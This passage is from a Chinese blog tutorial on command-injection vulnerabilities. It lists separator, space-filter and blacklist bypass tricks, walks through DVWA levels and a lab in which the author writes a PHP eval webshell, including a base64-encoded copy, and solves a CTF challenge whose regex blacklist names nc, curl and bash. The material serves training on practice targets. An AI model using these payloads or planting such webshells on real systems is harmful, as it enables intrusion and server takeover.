+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls &amp; whoami</span><br><span class="line">ls &amp;&amp; whoami</span><br><span class="line">ls | whoami</span><br><span class="line">ls || whoami</span><br></pre></td></tr></table></figure>
+
+<h4 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a><strong>空格过滤</strong></h4><p>空格过滤会经常遇到，基本都被过滤了，但是绕过的方法也是非常多的。</p>
+<ul>
+<li>${IFS}</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$&#123;IFS&#125;flag //等同于cat flag</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>$IFS$9     $9指传过来的第9个参数</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS$9flag //等同于cat flag</span><br><span class="line">cat$IFS$1flag //等同于cat flag</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>%09(需要PHP环境)</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat%09flag //等同于cat flag</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>&lt;或者&lt;&gt;重定向</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;flag //等同于cat flag</span><br><span class="line">cat&lt;&gt;flag //等同于cat flag</span><br></pre></td></tr></table></figure>
+
+<p>这里解释一下${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，只有cat$IFSflag.txt的时候,bash解释器会把整个IFSa当做变量名，所以导致没有办法运行，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，而$9指的是当前系统shell进程的第九个参数的持有者，就是一个空字符串，因此$9相当于没有加东西，等于做了一个前后隔离。</p>
+<h4 id="黑名单过滤"><a href="#黑名单过滤" class="headerlink" title="黑名单过滤"></a>黑名单过滤</h4><p>比如：过滤了cat或者flag</p>
+<ul>
+<li>变量拼接</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=f;d=lag; $a$b $c$d //$a$b $c$d等同于cat flag</span><br><span class="line">a=cat;b=fla;c=g; $a&lt;&gt;$b$c  //$a&lt;&gt;$b$c等同于cat flag</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>单引号，双引号绕过</li>
+</ul>
+<p>在引号内，加空格和没加空格是不一样的。在我们用一对引号穿插进要输入的命令中的时候，可以达到绕过黑名单且不影响最终结果的功效</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ca&#x27;&#x27;t flag</span><br><span class="line">ca&quot;&quot;t fl&#x27;&#x27;ag</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>编码绕过</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(printf &quot;\154\163&quot;)   ===========================&gt;ls</span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;)==&gt;cat /flag</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>读文件绕过（当cat被过滤）</li>
+</ul>
+<p>用其它可以读文件的指令代替cat即可。上面的常用指令中已有说明，此处不再描述。</p>
+<ul>
+<li>反斜杠绕过</li>
+</ul>
+<p>反斜杠为换行符，Linux允许我们将语句打散到多行再执行，因此可以有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\a\t fla\g  </span><br></pre></td></tr></table></figure>
+
+<p>例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-8-9-centos /]# ca\</span><br><span class="line">&gt; t\</span><br><span class="line">&gt;  fl\</span><br><span class="line">&gt; ag</span><br><span class="line">flag&#123;test&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="DVWA实践"><a href="#DVWA实践" class="headerlink" title="DVWA实践"></a>DVWA实践</h3><p>low级别：</p>
+<p>输入127.0.0.1，发现是ping本机的结果</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210323124219358.png" alt="image-20210323124219358"></p>
+<p>加一个管道符，看看是否执行后面命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|dir</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210323124322666.png" alt="image-20210323124322666"></p>
+<p>发现可执行，那么这道题就可以说结束了。</p>
+<p>Medium级别：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|dir</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210323124556441.png" alt="image-20210323124556441"></p>
+<p>发现还是可以用，看了下源码。原来过滤了&amp;&amp;和; 但是没有过滤|，所以这道题也可以说结束了。</p>
+<p>High级别：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|dir</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210323125332632.png" alt="image-20210323125332632"></p>
+<p>怎么那么简单？看了下源代码</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210323125421161.png" alt="image-20210323125421161"></p>
+<p>发现过滤的|后面有个空格，所以127.0.0.1|dir 直接执行了dir。</p>
+<h3 id="工作室靶场"><a href="#工作室靶场" class="headerlink" title="工作室靶场"></a>工作室靶场</h3><p>ping</p>
+<p>开局一个输入框一个提交按钮</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210323125945669.png" alt="image-20210323125945669"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210323130001586.png" alt="image-20210323130001586"></p>
+<p>发现管道符可以绕过执行命令，那就ls看看。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210323131356076.png" alt="image-20210323131356076"></p>
+<p>发现只有一个index.php。看看能不能写文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|echo &quot;&lt;?php phpinfo();?&gt;&quot; &gt; hack.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210323130139747.png" alt="image-20210323130139747"></p>
+<p>可用，写个马儿试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|echo &quot;&lt;?php @eval($_POST[&#x27;hack&#x27;]);?&gt;&quot; &gt;hack.php</span><br></pre></td></tr></table></figure>
+
+<p>发现可以写进去，但是执行不了任何命令。看看到底写了什么进去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|cat hack.php&gt;1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210323130443455.png" alt="image-20210323130443455"></p>
+<p>发现$后面的东西被过滤了。那就绕过，我这里选择用base64编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|echo &quot;PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8+&quot;|base64 -d &gt;hack.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210323130904649.png" alt="image-20210323130904649"></p>
+<p>再看一道题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$filter </span>= <span class="string">&#x27;/#|`| |</span></span><br><span class="line"><span class="string">[\x0a]|ls|rm|sleep|sh|bash|grep|nc|ping|curl|cat|tac|od|more|less|nl|vi|unique|h</span></span><br><span class="line"><span class="string">ead|tail|sort|rev|string|find|\$|\(\|\)|\[|\]|\&#123;|\&#125;|\&gt;|\&lt;|\?</span></span><br><span class="line"><span class="string">|\&#x27;|&quot;|\*|;|\||&amp;|\/|\\\\/is&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd </span>= <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="variable">$filter</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">    system(<span class="variable">$cmd</span>.<span class="string">&quot;echo &#x27;hi~&#x27;&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>ban了ls，使用dir查看目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=dir%09.%09</span><br></pre></td></tr></table></figure>
+
+<p>看见flag文件 CvvD_F14g_1s_h4rehaha.php ，cut命令读取获得flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=cut%09-f%091%09CvvD_F14g_1s_h4rehaha.php%09</span><br></pre></td></tr></table></figure>
+
+<p>参考blog：<a target="_blank" rel="noopener" href="http://www.plasf.cn/">http://www.plasf.cn/</a></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://example.com/2021/11/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="命令执行漏洞" target="_blank" rel="external">http://example.com/2021/11/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/cofess" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/cofess" target="_blank"><span class="text-dark">chickenmushroom</span><small class="ml-1x">Web</small></a></h3>
+        <div>平平无奇的小红帽。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8Bweb%E5%92%8Cmisc/" title="攻防世界新手web和misc"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2021/11/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D(ms17-010)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="永恒之蓝(ms17-010)漏洞复现"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+    <li class="toggle-toc">
+      <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="Catalogue" role="button">
+        <span>[&nbsp;</span><span>Catalogue</span>
+        <i class="text-collapsed icon icon-anchor"></i>
+        <i class="text-in icon icon-close"></i>
+        <span>]</span>
+      </a>
+    </li>
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="/null" target="_blank" title="Github" ><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Weibo" ><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Twitter" ><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Behance" ><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" ><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
